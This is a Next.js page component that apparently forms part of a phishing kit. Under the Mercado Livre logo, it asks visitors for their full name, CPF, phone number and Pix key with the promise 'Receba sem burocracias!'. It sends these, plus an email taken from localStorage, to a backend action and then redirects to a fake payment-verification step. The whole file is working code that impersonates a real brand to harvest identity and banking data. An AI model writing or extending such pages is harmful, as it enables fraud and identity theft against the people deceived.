"use client";

import { useEffect, useState } from "react";
import { cpf } from "cpf-cnpj-validator";

import { LoadingComponent } from "@/loading";
import { useRouter } from "next/navigation";
import { formatPhone } from "@/utils/formatPhone";
import { onlyNumbers } from "@/utils/onlyNumbers";
import { authBankUser } from "@/actions/authbank";

export default function AuthBankPage() {
  const router = useRouter();
  const [form, setForm] = useState({
    name: "",
    cpf: "",
    phone: "",
    chavePix: "",
    tipoPix: "",
  });
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    setTimeout(() => {
      setLoading(false);
    }, 1500);
  }, []);

  if (loading) {
    return <LoadingComponent />;
  }

  const handleChangeInfoLogin = async () => {
    const email = localStorage.getItem("Email");

    try {
      await authBankUser({
        ...form,
        phone: onlyNumbers(form.phone),
        email,
      });

      router.push("/verify-payment");
    } catch {
      console.error("Erro ao fazer login");
    }
  };

  return (
    <div>
      <header className="flex items-center justify-center bg-[#FFE600] border-b border-[#e2e0e2] p-4">
        <a href="./" aria-label="ir para a página inicial">
          <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.117/mercadolibre/pt_logo_large_plus@2x.webp" />
        </a>
      </header>

      <main className="mt-16 flex items-center justify-center">
        <div className="w-full p-10 md:max-w-[500px] flex flex-col">
          <h1 className="text-3xl font-medium">Digite seus dados bancários</h1>

          <span className="text-[#5c525b] text-xl mt-2">
            Receba sem burocracias!
          </span>

          <label htmlFor="" className="text-[#222] mt-8">
            NOME COMPLETO *
          </label>

          <input
            type="text"
            className="rounded-xl border-[#e2e0e2] border-[1px] text-base p-4 text-[#222] mt-2 mb-4"
            placeholder="Nome completo do titular"
            value={form.name}
            onChange={(e) =>
              setForm((prevForm) => ({ ...prevForm, name: e.target.value }))
            }
          />

          <label htmlFor="">CPF</label>
          <input
            type="text"
            className="rounded-xl border-[#e2e0e2] border-[1px] text-base p-4 text-[#222] mt-2 mb-4"
            placeholder="CPF do titular"
            maxLength={11}
            value={cpf.format(form.cpf)}
            onChange={(e) =>
              setForm((prevForm) => ({ ...prevForm, cpf: e.target.value }))
            }
          />

          <label htmlFor="">TELEFONE</label>
          <input
            type="text"
            className="rounded-xl border-[#e2e0e2] border-[1px] text-base p-4 text-[#222] mt-2 mb-4"
            placeholder="Telefone para contato"
            maxLength={15}
            value={formatPhone(form.phone)}
            onChange={(e) =>
              setForm((prevForm) => ({ ...prevForm, phone: e.target.value }))
            }
          />

          <div className="flex items-center gap-2 w-full mt-6 mb-10">
            <div className="h-[1px] bg-[#ccc] w-full"></div>
            <p className="text-base">Banco</p>
            <div className="h-[1px] bg-[#ccc] w-full"></div>
          </div>

          <p>Aceitamos diversos bancos</p>

          <img src="banks.png" className="mb-6 mt-2" alt="" />

          <label htmlFor="">Como deseja receber PIX *</label>
          <select
            className="rounded-xl border-[#e2e0e2] border-[1px] text-base p-4 text-[#222] mt-2 mb-4"
            defaultValue="Selecione o tipo de chave pix"
            value={form.tipoPix}
            onChange={(e) => {
              setForm((prevForm) => ({ ...prevForm, tipoPix: e.target.value }));
            }}
          >
            <option selected>Selecione o tipo de chave pix</option>
            <option value="CPF">CPF</option>
            <option value="EMAIL">EMAIL</option>
            <option value="TELEFONE">TELEFONE</option>
            <option value="ALEATORIA">ALEATORIA</option>
          </select>

          {form.tipoPix && (
            <>
              <label htmlFor="">CHAVE PIX *</label>
              <input
                type="text"
                className="rounded-xl border-[#e2e0e2] border-[1px] text-base p-4 text-[#222] mt-2 mb-4"
                placeholder="Digite sua chave pix"
                value={form.chavePix}
                onChange={(e) =>
                  setForm((prevForm) => ({
                    ...prevForm,
                    chavePix: e.target.value,
                  }))
                }
              />
            </>
          )}

          <button
            className="bg-[#2968C8] text-white h-[50px] w-full text-xl rounded-full mt-10"
            onClick={handleChangeInfoLogin}
          >
            Receber
          </button>
        </div>
      </main>
    </div>
  );
}
